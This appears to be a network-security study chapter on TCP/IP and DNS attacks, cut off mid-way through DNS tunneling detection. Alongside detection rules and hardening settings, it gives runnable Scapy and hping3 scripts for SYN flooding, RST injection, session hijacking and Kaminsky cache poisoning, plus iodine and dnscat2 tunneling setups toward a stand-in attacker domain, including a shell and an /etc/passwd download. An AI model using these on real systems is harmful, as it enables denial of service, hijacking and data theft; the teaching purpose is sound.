# Domain 9, Chapter 9A — TCP/IP, DNS, and TLS Security

> **Scope.** TCP/IP: SYN flooding and SYN cookies, sequence number prediction, reset attacks, session hijacking, SACK panic, IP fragmentation attacks, IPv6 extension header abuse, NDP spoofing, ICMP attacks, TCP side-channel attacks, idle scan, TCP timestamp leakage, covert channels, Sockstress, TCP Fast Open security. DNS: Kaminsky attack, rebinding, tunneling, DNSSEC (NSEC walking, algorithm downgrade, DANE), DoH/DoT, amplification, NXDOMAIN attacks, phantom domain attacks, cache snooping, protocol internals. TLS: 1.2 vs 1.3 handshake, 0-RTT replay, downgrade attacks, padding oracles (Lucky13, Bleichenbacher/ROBOT), compression oracles (CRIME/BREACH), certificate validation, Certificate Transparency, mutual TLS, Logjam, post-quantum (ML-KEM), QUIC/HTTP/3, DTLS, TLS fingerprinting (JA3/JA4+), renegotiation attacks, session resumption, certificate pinning, OCSP stapling. MITM: ARP poisoning, SSL stripping, HSTS bypass, interception proxies. Scanning: Nmap scan types, masscan, Zmap. Packet crafting: Scapy, hping3, nping. Firewall evasion: fragmentation, TTL manipulation, protocol confusion.

---

## 1. TCP/IP stack attacks

### 1.1 SYN flooding and SYN cookies

#### Mechanism

A SYN flood sends a massive volume of TCP SYN packets with spoofed source addresses. The server allocates a TCB (Transmission Control Block) for each half-open connection, exhausting memory (the SYN backlog queue). The kernel maintains a per-listener hash table of SYN_RECV sockets; when this fills, legitimate connections are dropped.

The TCP three-way handshake state machine:
```
Client                    Server
  |--- SYN (seq=x) ------->|   Server allocates TCB, moves to SYN_RECV
  |<-- SYN-ACK (seq=y, ack=x+1) ---|
  |--- ACK (ack=y+1) ----->|   Connection ESTABLISHED, TCB fully populated
```

During a SYN flood, the server never receives the final ACK. Each SYN_RECV socket consumes ~280 bytes (Linux 6.x). With a default backlog of 1024 (`tcp_max_syn_backlog`), memory exhaustion is not the primary issue — the backlog queue overflow is. The kernel drops new SYNs when the queue is full.

Amplification: SYN floods can be amplified through SYN-ACK reflection. The attacker sends SYNs with the victim's IP as source to many servers; those servers send SYN-ACKs (and retransmit them 5 times by default) to the victim. Amplification factor: ~3.8x per reflector (1 SYN → ~5 SYN-ACK retransmissions, each larger than the SYN).

#### SYN cookies defense

**SYN cookies** (RFC 4987, Linux implementation in `net/ipv4/tcp_ipv4.c`): when the SYN backlog is full, the kernel does not allocate a TCB. Instead, it encodes the connection state (MSS, timestamp, sequence number) into the ISN (Initial Sequence Number) of the SYN-ACK. When the client completes the handshake with an ACK, the kernel reconstructs the connection state from the ACK's acknowledgment number (which is the SYN cookie + 1). No memory is consumed until the handshake completes. The trade-off: some TCP options (window scaling, SACK) cannot be encoded in the cookie and are lost.

`tcp_conn_request` is the kernel function that decides whether to use SYN cookies (when `tcp_max_syn_backlog` is exceeded and `net.ipv4.tcp_syncookies = 1`). `cookie_v4_init_sequence` generates the cookie.

The SYN cookie ISN is constructed as:
```
ISN = hash(saddr, daddr, sport, dport, secret_key) + (timestamp << 24) + (MSS_index << 0)
```

The MSS index is a 3-bit value encoding one of 8 possible MSS values. The timestamp uses 5 bits of the kernel's 64-second counter. The hash uses SipHash (since Linux 4.14).

#### Exploitation — SYN flood with Scapy

```python
#!/usr/bin/env python3
from scapy.all import *
import random

target_ip = "192.168.1.100"
target_port = 80

def syn_flood():
    while True:
        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        src_port = random.randint(1024, 65535)
        ip = IP(src=src_ip, dst=target_ip)
        tcp = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(0, 2**32-1))
        send(ip/tcp, verbose=0)

syn_flood()
```

With hping3:
```bash
hping3 -S --flood -V -p 80 --rand-source 192.168.1.100
# -S: SYN flag
# --flood: send as fast as possible (no reply wait)
# --rand-source: randomize source IP
```

#### Detection

Suricata rule for SYN flood:
```
alert tcp any any -> $HOME_NET any (msg:"Possible SYN flood"; flags:S,12; \
  threshold:type both, track by_dst, count 1000, seconds 10; \
  classtype:attempted-dos; sid:1000001; rev:1;)
```

Wireshark display filter:
```
tcp.flags.syn == 1 && tcp.flags.ack == 0
```

Zeek script for SYN flood detection:
```zeek
event connection_attempt(c: connection)
    {
    if ( c$id$resp_h in Site::local_nets )
        {
        local key = fmt("%s", c$id$resp_h);
        # SumStats tracking of SYN_SENT per destination
        SumStats::observe("syn.flood", [$str=key], [$num=1]);
        }
    }
```

#### Hardening — kernel parameters

```bash
# Enable SYN cookies
sysctl -w net.ipv4.tcp_syncookies=1

# Increase SYN backlog
sysctl -w net.ipv4.tcp_max_syn_backlog=65535

# Reduce SYN-ACK retries (default 5, reduce to 2)
sysctl -w net.ipv4.tcp_synack_retries=2

# Increase somaxconn (listen backlog ceiling)
sysctl -w net.core.somaxconn=65535

# Enable SYN flood protection via connection rate limiting (nftables)
nft add rule inet filter input tcp flags syn limit rate 500/second accept
nft add rule inet filter input tcp flags syn drop

# iptables equivalent
iptables -A INPUT -p tcp --syn -m limit --limit 500/s --limit-burst 1000 -j ACCEPT
iptables -A INPUT -p tcp --syn -j DROP
```

#### Real-world incidents

The 2016 Dyn DNS DDoS attack (Mirai botnet) used SYN floods among other vectors, disrupting DNS for Twitter, Netflix, Reddit, and others. Peak traffic exceeded 1.2 Tbps. The 2018 GitHub memcached amplification DDoS reached 1.35 Tbps.

---

### 1.2 TCP sequence number prediction

TCP relies on 32-bit sequence numbers for stream ordering and (historically) for authentication — the assumption was that only the legitimate endpoint knows the next expected sequence number. If an attacker can predict the ISN, they can inject spoofed TCP segments that the receiver accepts.

Modern kernels generate ISNs using a cryptographic PRF seeded with the connection 4-tuple and a secret key (`net/ipv4/tcp_ipv4.c`, `secure_tcp_seq`), producing effectively random 32-bit ISNs. The 2001 ISN randomization RFC (RFC 6528) standardized this. Older systems (pre-2001) used monotonically-increasing or time-based ISNs that were predictable.

#### ISN generation internals (Linux)

```c
// net/ipv4/tcp_ipv4.c (simplified)
u32 secure_tcp_seq(__be32 saddr, __be32 daddr, __be16 sport, __be16 dport)
{
    u32 hash;
    net_secret_init();  // initialize secret key once
    hash = siphash_3u32((__force u32)saddr, (__force u32)daddr,
                        (__force u32)(sport | (dport << 16)),
                        &net_secret);
    return seq_scale(hash);  // add time-based component
}
```

The `seq_scale()` function adds a time-based monotonically increasing component (64ns granularity on modern kernels) to prevent ISN reuse within TIME_WAIT windows.

#### Exploitation — ISN prediction (historical)

Kevin Mitnick's 1994 attack on Tsutomu Shimomura used ISN prediction against a Solaris system with predictable (time-based, ~128,000 increment per second) ISNs. The attack:

1. SYN flood the trusted host to prevent it from responding with RSTs
2. Send a spoofed SYN from the trusted host's IP to the target
3. Predict the ISN in the target's SYN-ACK (which goes to the trusted host, not the attacker)
4. Send a spoofed ACK with the predicted ISN+1
5. Inject rsh commands over the spoofed connection

#### Detection

Nmap ISN prediction analysis:
```bash
nmap -O --osscan-guess -v 192.168.1.100
# Reports ISN sequence predictability: "TCP Sequence Prediction: Difficulty=261 (Good luck!)"
# Values < 75 indicate vulnerable implementations
```

Zeek generates `conn.log` entries with `orig_seq` and `resp_seq` fields that can be analyzed offline for ISN predictability patterns.

---

### 1.3 TCP reset attacks (RST injection)

#### Mechanism

An attacker who can observe (or guess) the sequence number window of an active TCP connection can send a RST packet with a valid sequence number, terminating the connection. RFC 5961 tightened the acceptance window: a RST is only accepted if its sequence number matches the expected next sequence number exactly; otherwise, a challenge ACK is sent.

The receive window typically spans 64KB–4MB depending on window scaling. On a long-lived connection (e.g., BGP session), the attacker needs to guess within this window — with window scaling factor 7 (128KB × 128 = 16MB), the probability of a single RST being accepted is `window_size / 2^32`.

#### The Great Firewall technique

China's Great Firewall (GFW) uses RST injection to censor connections. When a DPI device detects forbidden content (keywords in HTTP, SNI in TLS ClientHello), it injects forged RST packets from both the client's and server's perspective (spoofing both sides). The RST packets have valid sequence numbers because the DPI device has observed the connection state.

Detection: the legitimate endpoints see unexpected RSTs with TTLs that differ from the real connection's TTL (the injected packets originate from a different network hop). Tools like `traceroute` combined with TTL analysis can identify the injection point.

#### CVE-2016-5696 — TCP side-channel attack

The `tcp_challenge_ack_limit` mitigation (Linux 4.8+, `net.ipv4.tcp_challenge_ack_limit` sysctl) limits the rate of challenge ACKs sent in response to invalid RSTs. The default was 100/second globally (not per-connection). An off-path attacker could:

1. Infer whether a connection exists between two hosts by sending RSTs with guessed 4-tuples and observing the global challenge ACK counter
2. Determine the valid sequence number by binary-searching the sequence space using the challenge ACK rate as a side channel
3. Inject data or RST the connection

Fix: randomize the challenge ACK limit per second (Linux 4.7+). The sysctl `tcp_challenge_ack_limit` now adds a random value (0 to limit/2) to the configured limit.

#### Exploitation — RST injection with Scapy

```python
#!/usr/bin/env python3
from scapy.all import *

# Inject RST into an observed connection
# Assumes attacker has sniffed a packet and knows seq/ack
target_ip = "192.168.1.100"
target_port = 80
src_ip = "10.0.0.50"     # spoofed source (the other endpoint)
src_port = 45678

# The RST seq must fall within the receiver's window
# Use the last observed ACK from the target as the RST sequence number
observed_ack = 0xDEADBEEF

ip = IP(src=src_ip, dst=target_ip)
tcp = TCP(sport=src_port, dport=target_port, flags="R", seq=observed_ack)
send(ip/tcp)
```

With hping3 (blind RST, brute-force the sequence space):
```bash
# Send RSTs with incrementing sequence numbers
hping3 -R -s 45678 -p 80 -a 10.0.0.50 --seq 0 --setseq --incr 65536 -c 65536 192.168.1.100
```

#### Detection and hardening

Suricata rule for RST injection:
```
alert tcp any any -> $HOME_NET any (msg:"Suspicious TCP RST flood"; flags:R; \
  threshold:type both, track by_src, count 50, seconds 5; \
  classtype:attempted-dos; sid:1000002; rev:1;)
```

Wireshark filter for RST analysis:
```
tcp.flags.reset == 1 && tcp.window_size == 0
```

Kernel hardening:
```bash
# Randomize challenge ACK limit (CVE-2016-5696 mitigation)
sysctl -w net.ipv4.tcp_challenge_ack_limit=2147483647

# For BGP sessions: use TCP-AO (RFC 5925) or TCP MD5 (RFC 2385)
# BGP daemon configuration (FRRouting example):
# neighbor 10.0.0.1 password MySecretKey
```

---

### 1.4 TCP session hijacking

#### Mechanism

TCP hijacking (desynchronization attack) injects data into an established TCP connection by spoofing one endpoint's IP. The attacker must know (or predict) the current sequence numbers of both sides.

The desynchronization technique:
1. Attacker sends a forged packet to the server with the client's IP, carrying data that advances the server's expected sequence number
2. The server ACKs this data, but the real client doesn't expect that ACK (its sequence number hasn't advanced)
3. The connection is now desynchronized: the server expects sequence number X+N, but the client is still at X
4. The real client's packets are dropped (wrong sequence number), while the attacker can continue sending with sequence numbers the server expects

#### Exploitation with Scapy (on-path)

```python
#!/usr/bin/env python3
from scapy.all import *

def hijack_session(pkt):
    """Sniff a packet, then inject data into the TCP stream."""
    if pkt.haslayer(TCP) and pkt[TCP].flags == 0x18:  # PSH-ACK
        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        tcp = TCP(
            sport=pkt[TCP].dport,
            dport=pkt[TCP].sport,
            seq=pkt[TCP].ack,           # our seq = their last ack
            ack=pkt[TCP].seq + len(pkt[TCP].payload),
            flags="PA"
        )
        payload = b"GET /malicious HTTP/1.1\r\nHost: target.com\r\n\r\n"
        send(ip/tcp/payload)

sniff(filter="tcp and host 192.168.1.100", prn=hijack_session, count=1)
```

#### Detection

Zeek script for retransmission anomalies (indicator of desynchronization):
```zeek
event tcp_rexmit(c: connection, is_orig: bool, seq: count, len: count,
                  data_in_flight: count, window: count)
    {
    if ( data_in_flight > window * 2 )
        NOTICE([$note=Weird::Activity,
                $msg=fmt("Possible TCP hijacking: retransmission anomaly on %s", c$uid),
                $conn=c]);
    }
```

Wireshark filters for session hijacking indicators:
```
# Retransmissions with different data (hijacking indicator)
tcp.analysis.retransmission && tcp.len > 0

# Duplicate ACKs from unexpected source
tcp.analysis.duplicate_ack

# Out-of-order segments
tcp.analysis.out_of_order
```

---

### 1.5 Idle scan (IPID side-channel)

#### Mechanism

The idle scan (also called zombie scan) uses a third-party "zombie" host to scan a target without revealing the scanner's IP. It exploits the predictable IP Identification (IPID) field in IP headers.

Prerequisites: the zombie must have a globally incrementing IPID (increments by 1 for each packet sent) and low traffic (so the IPID doesn't increment from other traffic).

The technique:
1. Scanner probes zombie's IPID (send SYN-ACK, receive RST with IPID=X)
2. Scanner sends spoofed SYN to target with zombie's IP as source
3. If the target port is **open**: target sends SYN-ACK to zombie → zombie sends RST (IPID increments by 1)
4. If the target port is **closed**: target sends RST to zombie → zombie ignores it (IPID unchanged)
5. Scanner probes zombie's IPID again: if IPID=X+2, port is open; if IPID=X+1, port is closed

#### Exploitation with hping3 and nmap

```bash
# Step 1: Find a zombie with incremental IPID
hping3 -S -r -p 80 192.168.1.50
# Watch the id field; if it increments by +1 per probe, it's a valid zombie

# Step 2: Run idle scan with nmap
nmap -Pn -sI 192.168.1.50 -p 1-1024 192.168.1.100
# -sI: idle scan using 192.168.1.50 as zombie
# -Pn: skip host discovery (necessary for idle scan)
```

Scapy implementation:
```python
#!/usr/bin/env python3
from scapy.all import *

zombie = "192.168.1.50"
target = "192.168.1.100"

def get_ipid(host):
    """Probe the zombie's current IPID."""
    resp = sr1(IP(dst=host)/TCP(dport=80, flags="SA"), timeout=2, verbose=0)
    if resp:
        return resp[IP].id
    return None

def idle_scan(target_port):
    ipid1 = get_ipid(zombie)
    # Send spoofed SYN from zombie to target
    send(IP(src=zombie, dst=target)/TCP(dport=target_port, flags="S"), verbose=0)
    time.sleep(1)
    ipid2 = get_ipid(zombie)

    if ipid2 - ipid1 == 2:
        return "open"
    elif ipid2 - ipid1 == 1:
        return "closed|filtered"
    else:
        return "unknown (zombie too noisy)"

for port in [22, 80, 443]:
    print(f"Port {port}: {idle_scan(port)}")
```

---

### 1.6 TCP timestamp information leakage

#### Mechanism

TCP timestamps (RFC 7323, `TSval`/`TSecr` options) are used for RTT estimation and PAWS (Protection Against Wrapped Sequences). The `TSval` is a monotonically increasing counter, typically incrementing at 1–1000 Hz depending on the OS. This leaks:

1. **Host uptime**: `TSval / tick_rate` reveals how long since last boot
2. **Host fingerprinting**: the tick rate differs per OS (Linux: 1000 Hz, Windows: variable, FreeBSD: 1000 Hz)
3. **NAT detection**: multiple hosts behind a NAT have different TSval progressions — analyzing timestamp slopes reveals the number of distinct hosts
4. **De-anonymization**: Tor users behind a NAT can be fingerprinted via TCP timestamp clock skew

#### Detection of timestamp leakage

```bash
# Nmap timestamp probe
nmap -O -v 192.168.1.100
# Reports "TCP Timestamp: YES" and uptime estimate

# Wireshark filter to extract timestamps
tcp.options.timestamp.tsval
```

#### Hardening

```bash
# Disable TCP timestamps (may impact PAWS and performance on high-bandwidth links)
sysctl -w net.ipv4.tcp_timestamps=0

# Alternative: enable timestamp randomization (Linux 5.0+)
# Randomizes the timestamp offset per connection
sysctl -w net.ipv4.tcp_timestamps=2
```

---

### 1.7 TCP covert channels

#### ISN covert channel

The 32-bit ISN field can be used to encode hidden data. The sender crafts TCP SYN packets where the ISN encodes a message (e.g., 4 bytes per SYN). The receiver extracts the ISNs from the SYN-ACK (which echoes ISN+1).

```python
#!/usr/bin/env python3
from scapy.all import *
import struct

# Sender: encode message in ISN
message = b"SECRET DATA HERE"
dst = "192.168.1.100"

for i in range(0, len(message), 4):
    chunk = message[i:i+4].ljust(4, b'\x00')
    isn = struct.unpack("!I", chunk)[0]
    send(IP(dst=dst)/TCP(dport=80, flags="S", seq=isn), verbose=0)
```

#### Urgent pointer covert channel

The TCP urgent pointer field (16 bits) is rarely used legitimately. Data can be encoded in this field when the URG flag is not set (most IDS ignore the urgent pointer when URG=0).

#### TCP options field covert channel

Custom or unused TCP options (kind values 9–26 are unassigned) can carry hidden data. The options field supports up to 40 bytes of options per segment.

#### Detection

Zeek script for covert channel detection:
```zeek
event tcp_option(c: connection, is_orig: bool, opt: count, optlen: count)
    {
    # Flag unusual TCP option kinds
    if ( opt > 8 && opt < 30 && opt != 28 && opt != 29 )
        NOTICE([$note=Weird::Activity,
                $msg=fmt("Unusual TCP option kind=%d on %s", opt, c$uid),
                $conn=c]);
    }
```

Wireshark filter for anomalous TCP options:
```
tcp.options && !(tcp.option_kind == 0 || tcp.option_kind == 1 || tcp.option_kind == 2 || tcp.option_kind == 3 || tcp.option_kind == 4 || tcp.option_kind == 5 || tcp.option_kind == 8)
```

---

### 1.8 Sockstress attack

#### Mechanism

Sockstress (2008) exhausts server resources by completing the TCP handshake and then manipulating the TCP window. The attacker:

1. Completes a normal 3-way handshake
2. Sets the TCP window size to 0 in subsequent ACKs (zero window)
3. The server enters "persist mode," periodically probing the client with window probes
4. Each connection consumes a fully established socket (more resources than SYN_RECV)
5. The attacker opens thousands of such connections, exhausting file descriptors and memory

Unlike SYN floods, SYN cookies do not help because the handshake completes legitimately.

#### Exploitation

```bash
# Using nping for Sockstress-style attack
nping --tcp-connect -p 80 --rate 1000 -c 0 192.168.1.100
# Opens connections at high rate; combine with firewall rules to drop server's data
# (forcing zero-window behavior)
```

#### Hardening

```bash
# Reduce TCP keepalive time (detect dead connections faster)
sysctl -w net.ipv4.tcp_keepalive_time=60
sysctl -w net.ipv4.tcp_keepalive_intvl=10
sysctl -w net.ipv4.tcp_keepalive_probes=3

# Reduce FIN_WAIT2 timeout
sysctl -w net.ipv4.tcp_fin_timeout=15

# Limit connections per source IP (nftables)
nft add rule inet filter input tcp dport 80 ct state new \
  meter per_ip_limit { ip saddr limit rate 20/second burst 40 packets } accept
nft add rule inet filter input tcp dport 80 ct state new drop
```

---

### 1.9 TCP Fast Open (TFO) security implications

#### Mechanism

TCP Fast Open (RFC 7413) allows data in the SYN packet, eliminating one RTT for repeat connections. The server issues a TFO cookie (encrypted with a server-side key) on the first connection. On subsequent connections, the client includes the cookie in the SYN; the server validates it and immediately processes the SYN payload.

Security implications:
- **Replay**: an attacker can replay the SYN+cookie+data. TFO data may be delivered multiple times. Applications must handle idempotency.
- **Cookie theft**: if an attacker obtains a valid TFO cookie (via network sniffing or cache attack on the client), they can impersonate the client for the cookie's lifetime.
- **Amplification**: without TFO, the server doesn't send data until the handshake completes. With TFO, the server may send a response immediately upon receiving the SYN, enabling spoofed-source amplification (the response goes to the spoofed victim).

#### Hardening

```bash
# Disable TFO if not needed
sysctl -w net.ipv4.tcp_fastopen=0

# Enable TFO with server-only (value 2) — no client-side TFO
sysctl -w net.ipv4.tcp_fastopen=2

# Rotate TFO keys periodically
sysctl -w net.ipv4.tcp_fastopen_key="$(openssl rand -hex 16)"
```

---

### 1.10 IP fragmentation attacks

**Teardrop**: overlapping IP fragments with contradictory offset/length values crash vulnerable reassembly implementations. **Ping of death**: an ICMP packet that, after reassembly, exceeds the maximum IP packet size (65535 bytes), overflowing buffers. **Fragment overlap**: overlapping fragments where the second fragment overwrites part of the first, potentially rewriting header fields that a firewall or IDS already inspected. **IDS evasion**: an attacker sends fragmented packets where each fragment alone doesn't trigger IDS signatures; only the reassembled packet is malicious.

Modern kernels handle all these correctly, but firewall and IDS configurations that inspect only individual fragments (not reassembled packets) remain vulnerable to evasion.

#### Exploitation — fragmentation evasion

```bash
# Nmap fragmented scan (8-byte fragments)
nmap -f -sS -p 80 192.168.1.100

# Nmap with custom fragment size
nmap --mtu 16 -sS -p 80 192.168.1.100

# fragroute — fragment and reorder packets
# /etc/fragroute.conf:
# ip_frag 8
# ip_chaff dup
# order random
fragroute -f /etc/fragroute.conf 192.168.1.100
```

Scapy fragmentation:
```python
#!/usr/bin/env python3
from scapy.all import *

# Send a fragmented TCP SYN
target = "192.168.1.100"
ip = IP(dst=target)
tcp = TCP(dport=80, flags="S")
payload = Raw(b"A" * 64)

# Fragment into 8-byte IP fragments
frags = fragment(ip/tcp/payload, fragsize=8)
for f in frags:
    send(f, verbose=0)
```

#### Hardening

```bash
# nftables: drop all IP fragments (aggressive, may break legitimate traffic)
nft add rule inet filter input ip frag-off != 0 drop

# iptables: reassemble fragments before inspection
iptables -A INPUT -f -j DROP

# Better approach: ensure conntrack reassembles fragments
sysctl -w net.ipv4.ip_no_pmtu_disc=0
# Enable Suricata's defrag engine (enabled by default in suricata.yaml):
# defrag:
#   max-frags: 65535
#   prealloc: yes
#   timeout: 60
```

---

### 1.11 IPv6 specifics

**Extension header abuse.** IPv6 allows a chain of extension headers (Hop-by-Hop, Routing, Fragment, Destination, Authentication, ESP). An attacker can craft packets with long extension header chains that exhaust processing resources or bypass firewalls that don't parse past the first few headers.

**Routing Header Type 0** enabled source routing (specifying intermediate hops), enabling traffic amplification and firewall bypass. Deprecated by RFC 5095; modern stacks reject it.

**NDP spoofing.** Neighbor Discovery Protocol (the IPv6 equivalent of ARP) uses ICMPv6 Neighbor Solicitation/Advertisement. An attacker on the local link can spoof Neighbor Advertisements to redirect traffic (the IPv6 ARP-spoofing equivalent). **RA Guard bypass**: Router Advertisement Guard filters RA messages at the switch, but fragmented RAs or RAs with extension headers can bypass naive implementations.

**SLAAC privacy.** Stateless Address Autoconfiguration (SLAAC) generates IPv6 addresses from the interface's MAC address (EUI-64), creating a persistent device identifier. RFC 8981 (temporary addresses / privacy extensions) mitigates tracking by generating randomized interface identifiers.

#### Hardening

```bash
# Disable IPv6 router advertisements acceptance
sysctl -w net.ipv6.conf.all.accept_ra=0

# Disable IPv6 source routing
sysctl -w net.ipv6.conf.all.accept_source_route=0

# Enable IPv6 privacy extensions
sysctl -w net.ipv6.conf.all.use_tempaddr=2

# nftables: drop packets with Routing Header Type 0
nft add rule inet filter input ip6 nexthdr rt rt type 0 drop
```

---

### 1.12 ICMP attacks

**ICMP Redirect**: tells a host to route traffic for a specific destination through a different gateway. An attacker on the local network can redirect victim traffic through a malicious gateway (MitM). Modern OS defaults ignore ICMP redirects (`net.ipv4.conf.all.accept_redirects = 0`).

**PMTUD blackhole**: Path MTU Discovery relies on ICMP "Fragmentation Needed" messages. An attacker who blocks these (or sends forged ones with a very small MTU) causes the victim to either send oversized packets (that get dropped) or undersized packets (degrading performance).

#### Hardening

```bash
# Disable ICMP redirects
sysctl -w net.ipv4.conf.all.accept_redirects=0
sysctl -w net.ipv4.conf.all.send_redirects=0
sysctl -w net.ipv6.conf.all.accept_redirects=0

# Rate limit ICMP responses (mitigate ICMP flood)
sysctl -w net.ipv4.icmp_ratelimit=100

# Ignore ICMP echo requests (optional, breaks ping)
sysctl -w net.ipv4.icmp_echo_ignore_all=1

# nftables: rate-limit ICMP
nft add rule inet filter input icmp type echo-request limit rate 10/second accept
nft add rule inet filter input icmp type echo-request drop
```

---

## 2. DNS security

### 2.1 DNS protocol internals

#### Query/response format

DNS uses a fixed 12-byte header followed by variable-length sections:

```
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|                      ID (16 bits)                |
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|QR|   Opcode  |AA|TC|RD|RA|   Z    |   RCODE     |
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|                    QDCOUNT                       |
|                    ANCOUNT                       |
|                    NSCOUNT                       |
|                    ARCOUNT                       |
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
```

- **ID**: 16-bit transaction identifier — must match between query and response (the primary Kaminsky attack target)
- **QR**: 0=query, 1=response
- **RD/RA**: recursion desired/available
- **RCODE**: 0=NOERROR, 3=NXDOMAIN, 2=SERVFAIL

#### EDNS0 (RFC 6891)

Extension Mechanisms for DNS adds an OPT pseudo-record in the Additional section, allowing:
- UDP payload sizes up to 4096 bytes (vs. the original 512-byte limit)
- Extended RCODE space
- DNSSEC OK (DO) bit
- Client Subnet (ECS) for CDN optimization (privacy concern: leaks client subnet to authoritative servers)

EDNS0 is critical for DNSSEC (signatures make responses large) and is exploited for amplification attacks.

---

### 2.2 DNS poisoning — the Kaminsky attack

Classic DNS cache poisoning: the attacker races to respond to a victim resolver's query before the legitimate authoritative server, inserting a forged answer with a fake IP address. The challenge is matching the 16-bit transaction ID (TXID).

#### Kaminsky's attack — step-by-step

Kaminsky's insight (2008): instead of waiting for the resolver to make a query, the attacker triggers one by querying for a random subdomain (`random123.victim.com`). The resolver queries the authoritative server for `victim.com`. The attacker floods the resolver with forged responses for `random123.victim.com`, each with a different TXID guess. Each attempt is independent (different random subdomain), so the attacker can retry indefinitely without waiting for the cache TTL to expire.

If a forged response is accepted, it can include a delegation to the attacker's nameserver (via the Authority section), poisoning the entire `victim.com` zone.

Detailed sequence:
```
1. Attacker → Resolver: query for r4nd0m.victim.com
2. Resolver → Authoritative NS (victim.com): query for r4nd0m.victim.com
3. Attacker → Resolver: flood of forged responses:
   - Source IP: spoofed authoritative NS IP
   - Destination port: must match resolver's source port
   - TXID: guessed (0-65535)
   - Answer: r4nd0m.victim.com A 6.6.6.6
   - Authority: victim.com NS ns.evil.com    ← delegation to attacker
   - Additional: ns.evil.com A 6.6.6.6       ← glue record
4. If TXID and port match before real answer arrives:
   resolver caches ns.evil.com as authoritative for victim.com
5. All future queries for *.victim.com go to the attacker's NS
```

#### Exploitation with Scapy

```python
#!/usr/bin/env python3
from scapy.all import *
import random

resolver = "192.168.1.53"
auth_ns_ip = "10.0.0.1"       # spoofed authoritative NS
attacker_ns = "6.6.6.6"

for attempt in range(1000):
    subdomain = f"r{random.randint(0,999999)}.victim.com"

    # Trigger the query
    dns_query = IP(dst=resolver)/UDP(dport=53)/DNS(
        rd=1, qd=DNSQR(qname=subdomain))
    send(dns_query, verbose=0)

    # Flood forged responses
    for txid in range(0, 65536, 256):  # sample TXID space
        forged = IP(src=auth_ns_ip, dst=resolver)/UDP(sport=53, dport=random.randint(1024,65535))/DNS(
            id=txid, qr=1, aa=1, qd=DNSQR(qname=subdomain),
            an=DNSRR(rrname=subdomain, rdata=attacker_ns),
            ns=DNSRR(rrname="victim.com", type="NS", rdata="ns.evil.com"),
            ar=DNSRR(rrname="ns.evil.com", rdata=attacker_ns))
        send(forged, verbose=0)
```

#### Defenses

**Source port randomization** (adding ~16 bits of entropy beyond the 16-bit TXID, making the attacker guess both TXID and port — ~32 bits total). **Bailiwick checking**: the resolver rejects answer records for domains outside the queried zone (preventing the Authority-section delegation attack). **0x20 encoding**: randomly capitalizing letters in the query name (`viCTIm.cOm`) and verifying that the response matches the same capitalization — adding ~4–8 bits of entropy. **DNSSEC** (section 2.5) cryptographically signs responses, making forgery detectable.

#### Detection

Suricata rules:
```
alert dns any any -> $HOME_NET 53 (msg:"DNS query flood - possible Kaminsky attack"; \
  dns.query; threshold:type both, track by_src, count 500, seconds 10; \
  classtype:attempted-recon; sid:1000010; rev:1;)

alert udp any 53 -> $HOME_NET any (msg:"DNS response with suspicious authority delegation"; \
  content:"|00 02|"; offset:24; depth:2; \
  classtype:bad-unknown; sid:1000011; rev:1;)
```

---

### 2.3 DNS rebinding

The attacker controls a domain (`evil.com`) with a very short TTL. Step 1: the victim's browser loads a page from `evil.com` (resolving to the attacker's server). Step 2: the attacker changes `evil.com`'s DNS response to point at the victim's internal IP (e.g., `192.168.1.1`). Step 3: the JavaScript on the loaded page makes a new request to `evil.com` — which now resolves to `192.168.1.1`. The browser considers this same-origin (same domain), so the JavaScript can read the response from the internal service.

#### Exploitation with Singularity

```bash
# Install Singularity of Origin (DNS rebinding attack framework)
git clone https://github.com/nccgroup/singularity.git
cd singularity

# Configure the attack
# Edit cmd/singularity-server/main.go or use CLI flags:
./singularity-server \
  --DNSRebindStrategy=DNSRebindFromQueryFirstThenSecond \
  --FirstDNSAnswer=1.2.3.4 \        # attacker's server
  --SecondDNSAnswer=192.168.1.1 \   # target internal IP
  --HTTPServerPort=8080

# The attack page at http://evil.com:8080/ will:
# 1. Load JavaScript from attacker's server (1.2.3.4)
# 2. Wait for DNS cache to expire (TTL=0)
# 3. Re-resolve evil.com → 192.168.1.1
# 4. Fetch internal resources via same-origin JavaScript
```

#### Defense

DNS pinning in the browser (caching the original IP for the duration of the page load — but this is not consistently implemented), internal-network firewalls that block external domains resolving to internal IPs (DNS rebinding protection in dnsmasq: `stop-dns-rebind`), and application-level authentication on internal services.

Resolver-side defense (Unbound):
```
server:
    private-address: 10.0.0.0/8
    private-address: 172.16.0.0/12
    private-address: 192.168.0.0/16
    private-address: 169.254.0.0/16
    private-address: fd00::/8
    private-address: fe80::/10
```

---

### 2.4 DNS tunneling

Data is exfiltrated by encoding it in DNS query names (`base32data.tunnel.attacker.com`) and responses (TXT records, NULL records). The attacker runs a custom authoritative DNS server for `tunnel.attacker.com` that decodes the queries and returns commands in the responses.

#### Tool setup

**iodine** (IP-over-DNS):
```bash
# Server (attacker's authoritative NS for tunnel.attacker.com):
iodined -f -c -P secretpassword 10.0.0.1 tunnel.attacker.com
# -f: foreground
# -c: disable client IP check
# -P: password
# 10.0.0.1: tunnel interface IP

# Client (victim network):
iodine -f -P secretpassword tunnel.attacker.com
# Creates a tun0 interface; all traffic routed through DNS tunnel

# Bandwidth: 100-500 kbps depending on network conditions
```

**dnscat2** (command & control over DNS):
```bash
# Server:
ruby dnscat2.rb tunnel.attacker.com --secret=mysecret --security=authenticated

# Client:
./dnscat --dns=domain:tunnel.attacker.com --secret=mysecret

# In the dnscat2 console:
# dnscat2> session -i 1
# command (victim) > shell
# command (victim) > download /etc/passwd /tmp/passwd
```

**dns2tcp**:
```bash
# Server (/etc/dns2tcpd.conf):
# listen = 0.0.0.0
# port = 53
# user = nobody
# chroot = /tmp
# domain = tunnel.attacker.com
# resources = ssh:127.0.0.1:22,smtp:127.0.0.1:25
dns2tcpd -f /etc/dns2tcpd.conf

# Client:
dns2tcpc -r ssh -z tunnel.attacker.com -l 2222
ssh -p 2222 user@127.0.0.1
```

#### Detection

Detection indicators: unusually long domain names, high query rates to a single domain, TXT-record-heavy traffic, high entropy in query labels, and query/response size anomalies.

Suricata rules:
```
